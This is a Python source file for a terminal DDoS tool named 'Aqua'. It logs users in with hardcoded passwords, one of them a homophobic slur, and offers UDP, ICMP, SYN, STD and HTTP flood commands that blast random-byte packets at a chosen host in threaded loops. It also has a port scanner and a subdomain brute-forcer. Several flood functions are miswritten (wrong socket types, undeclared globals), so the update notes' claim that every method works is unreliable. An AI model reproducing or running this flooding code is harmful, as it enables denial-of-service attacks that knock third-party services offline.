#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("Connecting to servers...")
def modifications():
	print ("Contact Misfortune or Reaper the script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\033[38;2;251;217;242m
╔══════════════════════════════════════════════════════╗
║                     \033[00mDDoS METHODS\033[38;2;251;217;242m                     ║               
║══════════════════════════════════════════════════════║
║ \033[00mUDP  <host> <port> <timeout> <size>  \033[38;2;251;217;242m|\033[00m UDP  ATTACK\033[38;2;251;217;242m   ║
║ \033[00mICMP <host> <port> <timeout> <sizE>  \033[38;2;251;217;242m|\033[00m ICMP ATTACK\033[38;2;251;217;242m   ║
║ \033[00mSYN  <host> <port> <timeout> <size>  \033[38;2;251;217;242m|\033[00m SYN  ATTACK\033[38;2;251;217;242m   ║
║ \033[00mSTD  <host> <port> <timeout> <size> \033[38;2;251;217;242m |\033[00m STD  ATTACK\033[38;2;251;217;242m   ║
║ \033[00mHTTP <host> <port> <timeout> <size>  \033[38;2;251;217;242m|\033[00m HTTP ATTACK\033[38;2;251;217;242m   ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

info = """
"""

version = "3.2"

help = """\033[38;2;251;217;242m
╔══════════════════════════════════════════════════════╗
║                    \033[00mBASIC COMMANDS\033[38;2;251;217;242m                    ║
║══════════════════════════════════════════════════════║
║ \033[00mClear                         \033[38;2;251;217;242m|\033[00m CLEAR SCREEN\033[38;2;251;217;242m         ║
║ \033[00mExit                          \033[38;2;251;217;242m|\033[00m EXIT AQUA\033[38;2;251;217;242m         ║
║ \033[00mMethods                       \033[38;2;251;217;242m|\033[00m SINS METHODS\033[38;2;251;217;242m         ║
║ \033[00mTools                         \033[38;2;251;217;242m|\033[00m BASIC TOOLS\033[38;2;251;217;242m          ║
║ \033[00mUpdates                       \033[38;2;251;217;242m|\033[00m DISPLAY UPDATE NOTES\033[38;2;251;217;242m ║
║ \033[00mInfo                          \033[38;2;251;217;242m|\033[00m DISPLAY AQUAS INFO\033[38;2;251;217;242m║
╚══════════════════════════════════════════════════════╝\033[00m
"""

tools = """\033[38;2;251;217;242m
╔══════════════════════════════════════════════════════╗
║                        \033[00mTOOLS\033[38;2;251;217;242m                         ║
║══════════════════════════════════════════════════════║
║ \033[00mStopattacks                   \033[38;2;251;217;242m|\033[00m STOP ALL ATTACKS\033[38;2;251;217;242m     ║
║ \033[00mAttacks                       \033[38;2;251;217;242m|\033[00m RUNNING ATTACKS\033[38;2;251;217;242m      ║
║ \033[00mPing <host>                   \033[38;2;251;217;242m|\033[00m PING A host\033[38;2;251;217;242m          ║
║ \033[00mResolve <host>                \033[38;2;251;217;242m|\033[00m GRAB A DOMIANS IP\033[38;2;251;217;242m    ║
║ \033[00mportscan <host> <RANGE>       \033[38;2;251;217;242m|\033[00m portSCAN A host  \033[38;2;251;217;242m    ║
║ \033[00mDnsresolve <host>             \033[38;2;251;217;242m|\033[00m GRAB ALL SUB-DOMAINS\033[38;2;251;217;242m ║
║ \033[00mStats                         \033[38;2;251;217;242m|\033[00m DISPLAY AQUA STATS\033[38;2;251;217;242m║
╚══════════════════════════════════════════════════════╝\033[00m
"""

updatenotes = """\033[38;2;251;217;242m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUPDATE NOTES\033[38;2;251;217;242m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m- Better ascii menu\033[38;2;251;217;242m                                  ║
║ \033[00m- Updated command casing no longer only capital\033[38;2;251;217;242m      ║
║ \033[00m- Updated attack methods\033[38;2;251;217;242m                             ║
║ \033[00m- Timeout bug fixed\033[38;2;251;217;242m                                  ║
║ \033[00m- Background attacks\033[38;2;251;217;242m                                 ║
║ \033[00m- Running task displayer\033[38;2;251;217;242m                             ║
║ \033[00m- All tools fixed and working\033[38;2;251;217;242m                        ║
║ \033[00m- Fixed HTTP & SYN Methods All Methods Working\033[38;2;251;217;242m       ║ 
║ \033[00m- Deleted HTTP & Added STD, STD Is Working & Tested\033[38;2;251;217;242m  ║
╚══════════════════════════════════════════════════════╝\033[00m

"""
statz = """

║              \033[00mSTATS\033[38;2;251;217;242m                     ║

\033[00m- Attacks: \033[38;2;251;217;242m{}                                        
\033[00m- Found Domains: \033[38;2;251;217;242m{}                                  
\033[00m- PINGS: \033[38;2;251;217;242m{}                                          
\033[00m- portSCANS: \033[38;2;251;217;242m{}                                      
\033[00m- GRABBED IPS: \033[38;2;251;217;242m{}                                 
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[1;00m
c[0m[38;2;253;239;249m             ╓g`                                               ⁿ▄,
[38;2;251;217;242m          ╥▓╢╫                                                  ▐╣▓@,
[38;2;249;194;234m        ,▓╢╣╣╣▌                                                   ╣╣╣╣▓▄
[38;2;247;171;227m      ,▓╣╢╣╣╣╣▓                          y                       /╣╣╣╣╣╣▓▄
[38;2;245;148;219m     ▓╢╣╣╣╣╣╣╣╢▓W                    ╔▓   ▓,                   ,▓╣╣╣╣╣╣╣╣╣▓╖
[38;2;243;125;211m   ╔▓╣╣╢╢╣╣╣╣╣╣╢╢╣▓▓æ╖,    ,æ     ,g▓▓    ╙╣▓╖     *╖     ,╥@▓▓╣╣╣╣╣╣╣╣╢╢╣╢╣▓
[38;2;241;102;204m  ╔╢╣╣╢▓▓╣╣╣╣╣╣╣╣╣╣╢╢╣╣╢▓▓▀,,╓╓╓, "▓╣▌     ▓▓▀',,╓╓,,`▀▓▓╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣▓▓╣╣╣▓
[38;2;239;79;196m ╒╢╣▓╜ ╒╢╣╣╢▓╜`` `▀╣▓▀`╓@▓╢╢▓▀""╙▀▓▓▄╙╕   ▓`▄▓▓▀╙"╙▀▓╢▓▓▄,"▓╢╢╜```"▀▓╣╣╣▓  ▓╣╣▓
[38;2;236;56;188m ▓╣▓   ▓╣▓╜        ▀ ╔▓╣╣▓╜         ▀▓    ╓▓"         ▀╢╣╢▓, ▌        ▓╣╣    ▓╣L
[38;2;221;50;188mj╢▌    ▓▓           ▓╣╣╫╜             ▓  ╓▀             ▓╣╣╢▄          ╙╢     ▓▓
[38;2;206;43;189m▐▓     ▐           ▓╣╢╢`      ,╓╖╖,    ▓▓▌    ,╓╓,       ▓╢╣╢r          ▐      ╣
[38;2;191;37;189m╟'                 ▓╣╣▓     ,▓`    ▀@  ▓╢" ╓▓╜    ▀▄      ╣╢╣▌                 ▓
[38;2;176;30;190m▐                  ▓╣╣▌     ▓       j▓╕   Æ▓       ╟L     ╣╣╣`                 ╟
[38;2;161;23;190m L              ┌   ▓╣▓     ╚▄      "▀▓   ▓▀  ┐    ▓      ╢╣▀                  ▌
[38;2;146;17;191m                 ▓╖  ╙▓▓     '▓N▄╖▓▄         ▓▓╓▄&▀     ╓▓▓  ,╔▓              /
[38;2;131;10;191m              g▓▓"  "¬ `▀▓▄,       "▀╖     ▄▀`       ╓@▓╜ ,ⁿ` "▀▓▓╖
[38;2;115;3;192m            ╒▓"`       ⁿw   "▀R▄,    ▐▓   ▓    ,╓g▓╜"  ,⌐`       "▀▓
[38;2;101;3;172m                           ▓▓╖    ╙▀▓▓╖╙  ƒ`æ▓▓▀"    ▄▓▌
[38;2;87;3;152m                        ƒ           ▓▓  ,▓╜           ╙,
[38;2;73;2;132m                              `"*▓  ,, ▓ ▓ ,. ,▓²"`
[38;2;59;2;111m                                  ╙N, ▀▓╓▓╜,╓▓
[38;2;45;2;91m                                     `"▓╣▀"
[0m
"""

altbanner = """
\033[2;34m                         ______                    
\033[2;34m _________        .---"""      """---.              
\033[2;34m:______.-':      :  .--------------.  :             
\033[2;34m| \033[1;35m______\033[1;34m  |      | :                : |             
\033[2;34m|:\033[1;35m______B\033[1;34m:|      | |  \033[1;35mAqua:\033[0m\033[1;34m | |             
\033[2;34m|:\033[1;35m______B\033[1;34m:|      | |                | |             
\033[2;34m|:\033[1;35m______B\033[1;34m:|      | |  \033[1;35mWifi not\033[0m\033[1;34m      | |             
\033[2;34m|         |      | |  \033[1;35mfound.\033[0m\033[1;34m        | |             
\033[2;34m|:\033[1;35m_____\033[1;34m:  |      | |                | |             
\033[2;34m|    ==   |      | :                : |             
\033[2;34m|       \033[1;31mO\033[1;34m |      :  '--------------'  :             
\033[2;34m|       \033[1;31mo\033[1;34m |      :'---...______...---'              
\033[2;34m|       \033[1;31mo\033[1;34m |-._.-i___/'             \._              
\033[2;34m|'-.____\033[1;35mo\033[1;34m_|   '-.   '-...______...-'  `-._          
\033[2;34m:_________:      `.____________________   `-.___.-. 
\033[2;34m                 .'\033[1;35m.eeeeeeeeeeeeeeeeee.'.\033[1;34m      :___:
\033[0;35m sky222#6392 \033[0m\033[1;34m  .'\033[1;35m.eeeeeeeeeeeeeeeeeeeeee.'.\033[1;34m    
\033[2;34m              :____________________________:        
\033[2;34m                                                    \033[0m
\033[2;34m                                                            
"""

cookie = open(".AQUA_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
std = True


def synsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global std

	while True:
		sys.stdout.write("\x1b]2;Devices: 5 | Aqua V1\x07")
		sin = input("\033[38;2;253;239;249m[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m]-\033[38;2;59;2;111m家\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("aqua version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[38;2;251;217;242m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[38;2;251;217;242m{}                                  ".format(fsubs))
			print ("\033[00m- PINGS: \033[38;2;251;217;242m{}                                          ".format(tpings))
			print ("\033[00m- portSCANS: \033[38;2;251;217;242m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[38;2;251;217;242m{}\n                                    ".format(liips))
			main()
		elif sinput == "methods":
			print (method)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] {}\033[38;2;251;217;242m:\033[00m{} [\033[38;2;251;217;242mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] UPD Running processes: {}".format (uaid))
			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] ICMP Running processes: {}".format (iaid))
			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] SYN Running processes: {}".format (said))
			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] STD Running Processes: {}".format (said))
			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Total attacks running: {}\n".format (aid))
			main()
		elif sinput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;A Q U A |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/AQUA/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Domain: https://{} \033[38;2;251;217;242m>\033[00m Converted: {} [\033[38;2;251;217;242mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;A Q U A |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Domain: {} [\033[38;2;251;217;242mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE host!')
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] host: {} \033[00m[\033[38;2;251;217;242mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;S I N F U L L |{}ms| D E M O N S\x07".format (stop))
						print ("AQUA: {}:{} | Time: {}ms [\033[38;2;251;217;242mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;S I N F U L L |TIME OUT| D E M O N S\x07")
						print ("AQUA: {}:{} [\033[38;2;251;217;242mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
			if username == "guests":
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] host: {} invalid".format (host))
					main()
		elif sinput == "std":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] host: {} invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] host: {} invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] {} Not a command".format(sinput))
			main()



try:
	users = ["root", "guests", "me"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "gayman", "me"]
	password = getpass.getpass ("[+] Password: ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[38;2;253;239;249mAQUA\033[38;2;253;239;249m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()
